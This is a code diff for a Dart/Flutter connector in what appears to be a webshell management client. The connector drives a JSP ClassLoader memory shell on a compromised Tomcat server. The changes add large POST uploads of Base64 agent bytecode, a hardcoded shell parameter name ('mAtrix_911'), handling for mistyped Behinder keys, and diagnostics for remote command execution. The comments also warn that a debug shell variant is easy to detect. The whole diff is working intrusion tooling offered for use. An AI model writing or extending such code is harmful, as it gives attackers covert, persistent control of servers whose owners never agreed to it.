@@ -12,14 +12,94 @@ import '../models/file_entry.dart';
 import '../utils/encoding_utils.dart';
 import 'shell_connector.dart';
 
-/// `jsp_classloader_b64.jsp`：ClassLoader 加载 M.class 内存马
+/// ClassLoader 加载 M.class：默认马 `jsp_classloader_b64.jsp`；排错可选用
+/// `jsp_classloader_b64_debug.jsp`（明文错误，易暴露，勿当默认上线）。
 ///
 /// 通过上传 Base64 编码的 agent 字节码来实现全功能操作。
+/// [Webshell.password] 表示 **表单参数名**（须与 JSP 中 `getParameter` 一致），默认 `mAtrix_911`。
 class JspClassloaderConnector extends ShellConnector {
   JspClassloaderConnector(super.webshell);
 
   late final String _execKey = _randomHex32();
   String? _lastPingDiagnostic;
+
+  /// ClassLoader 单次 POST 体很大 + 服务端 defineClass，首次往往 >15s。
+  /// 若 ping 仍用 15s 超时，Dart 会取消 Future → 连接被掐断 →
+  /// 「Connection closed while receiving data」（误判成网络问题）。
+  static const _kPostTimeout = Duration(seconds: 120);
+  static const _kPingTimeout = Duration(seconds: 120);
+
+  Future<http.Response> _postLargeForm(
+    Uri uri,
+    Map<String, String> headers,
+    String body,
+  ) async {
+    final h = Map<String, String>.from(headers);
+    h['Connection'] = 'close';
+    h['Accept-Encoding'] = 'identity';
+    h['User-Agent'] ??= 'Mozilla/5.0 (compatible; Matrix-JSP-CL/1.0)';
+    if (kIsWeb) {
+      return http.post(uri, headers: h, body: body).timeout(_kPostTimeout);
+    }
+    final client = io.HttpClient()
+      ..connectionTimeout = const Duration(seconds: 60)
+      ..idleTimeout = const Duration(seconds: 120);
+    try {
+      final req = await client.postUrl(uri);
+      h.forEach((name, value) {
+        req.headers.set(name, value);
+      });
+      final bytes = utf8.encode(body);
+      req.contentLength = bytes.length;
+      req.add(bytes);
+      final resp = await req.close().timeout(_kPostTimeout);
+      final code = resp.statusCode;
+      final rh = <String, String>{};
+      resp.headers.forEach((name, values) {
+        rh[name] = values.join(',');
+      });
+      final builder = BytesBuilder(copy: false);
+      try {
+        await for (final chunk in resp) {
+          builder.add(chunk);
+        }
+      } on io.HttpException catch (e) {
+        // Tomcat 在 JSP 异常或连接策略下可能先发 200 再在收完 body 前 RST。
+        // 已收到部分 body → 仍当作成功（如 MATRIX_JSP_PING）。
+        // exec 类命令（rm、touch 等）成功时常 **零 stdout**，响应体为 0 字节；
+        // 部分环境下读流仍会触发 HttpException，不能要求 builder.length > 0。
+        if (code == 200) {
+          return http.Response.bytes(
+            builder.takeBytes(),
+            code,
+            headers: rh,
+          );
+        }
+        throw http.ClientException(
+          '${e.message}（HTTP $code，已收 ${builder.length} 字节）。'
+          '请查 Tomcat logs/catalina.out 是否 defineClass/JSP 报错；'
+          '并确认 server.xml Connector maxPostSize、maxSwallowSize 足够大。',
+          uri,
+        );
+      } on io.SocketException {
+        if (code == 200) {
+          return http.Response.bytes(
+            builder.takeBytes(),
+            code,
+            headers: rh,
+          );
+        }
+        rethrow;
+      }
+      return http.Response.bytes(builder.takeBytes(), code, headers: rh);
+    } on io.HttpException catch (e) {
+      throw http.ClientException('HttpException: ${e.message}', uri);
+    } on io.SocketException catch (e) {
+      throw http.ClientException('SocketException: ${e.message}', uri);
+    } finally {
+      client.close(force: true);
+    }
+  }
 
   static String _randomHex32() {
     final rng = math.Random.secure();
@@ -38,6 +118,30 @@ class JspClassloaderConnector extends ShellConnector {
   };
 
   /// UTF-8 字节级 percent-encode（与 charset=UTF-8 一致；按 codeUnit 编码会破坏中文）
+  /// 冰蝎 16 位 HEX 密钥；误填在「密码」里会导致表单参数名错误（内置 JSP 只认 mAtrix_911）
+  static bool _looksLikeBehinderHexKey(String s) {
+    final t = s.trim();
+    if (t.length != 16 && t.length != 32) return false;
+    for (var i = 0; i < t.length; i++) {
+      final c = t.codeUnitAt(i);
+      if (!((c >= 0x30 && c <= 0x39) ||
+          (c >= 0x61 && c <= 0x66) ||
+          (c >= 0x41 && c <= 0x46))) {
+        return false;
+      }
+    }
+    return true;
+  }
+
+  /// 内置 `jsp_classloader_b64.jsp` 写死 `getParameter("mAtrix_911")`，表单字段名必须是它；
+  /// [Webshell.password] 表示该字段名；若空或误填 HEX 密钥则回退为 mAtrix_911。
+  String _classloaderFormFieldName() {
+    final p = webshell.password?.trim() ?? '';
+    if (p.isEmpty) return 'mAtrix_911';
+    if (_looksLikeBehinderHexKey(p)) return 'mAtrix_911';
+    return p;
+  }
+
   static String _formEncode(String s) {
     final buf = StringBuffer();
     for (final b in utf8.encode(s)) {
@@ -76,9 +180,12 @@ class JspClassloaderConnector extends ShellConnector {
         }
       }
 
-      final paramName = webshell.password?.isNotEmpty == true
-          ? webshell.password!
-          : 'cmd';
+      if (payload.isEmpty) {
+        return '[Error] jsp_agent_M.b64 为空或未打入应用包。请确认 pubspec.yaml 含 data/jsp_agent_M.b64，'
+            '执行 flutter clean 后完整运行（勿仅用热重载）。';
+      }
+
+      final paramName = _classloaderFormFieldName();
 
       final bodyParts = <String>[
         '${_formEncode(paramName)}=${_formEncode(payload)}',
@@ -88,16 +195,14 @@ class JspClassloaderConnector extends ShellConnector {
         ),
       ];
 
-      final response = await http
-          .post(
-            uri,
-            headers: {
-              'Content-Type':
-                  'application/x-www-form-urlencoded; charset=UTF-8',
-            },
-            body: bodyParts.join('&'),
-          )
-          .timeout(const Duration(seconds: 25));
+      final response = await _postLargeForm(
+        uri,
+        {
+          'Content-Type':
+              'application/x-www-form-urlencoded; charset=UTF-8',
+        },
+        bodyParts.join('&'),
+      );
 
       if (response.statusCode == 200) {
         return decodeWithFallback(response.bodyBytes);
@@ -110,7 +215,9 @@ class JspClassloaderConnector extends ShellConnector {
     } on TimeoutException {
       return '[Timeout] 连接超时';
     } on http.ClientException catch (e) {
-      return '[Connection Error] ${e.message}';
+      return '[Connection Error] ${e.message}\n'
+          '（ClassLoader 单次 POST 约几十 KB，若反复出现请检查 Tomcat server.xml '
+          'Connector maxPostSize、maxSwallowSize，或目标是否在读完请求体前重置连接）';
     } catch (e) {
       return '[Error] $e';
     }
@@ -121,9 +228,19 @@ class JspClassloaderConnector extends ShellConnector {
   @override
   Future<bool> ping() async {
     try {
-      final r = await _sendJsp('ping').timeout(const Duration(seconds: 15));
-      _lastPingDiagnostic = r.contains('MATRIX_JSP_PING') ? null : r;
-      return r.contains('MATRIX_JSP_PING');
+      final r = await _sendJsp('ping').timeout(_kPingTimeout);
+      if (r.contains('MATRIX_JSP_PING')) {
+        _lastPingDiagnostic = null;
+        return true;
+      }
+      if (r.trim().isEmpty) {
+        _lastPingDiagnostic =
+            'HTTP 200 但响应体为空。常见原因：① 服务端 JSP 参数名不是「${_classloaderFormFieldName()}」'
+            '（内置马固定为 mAtrix_911，勿把冰蝎 HEX 密钥填进密码框当参数名）；② 目标未执行内存马或 defineClass 失败。';
+      } else {
+        _lastPingDiagnostic = r;
+      }
+      return false;
     } catch (e) {
       _lastPingDiagnostic = e.toString();
       return false;
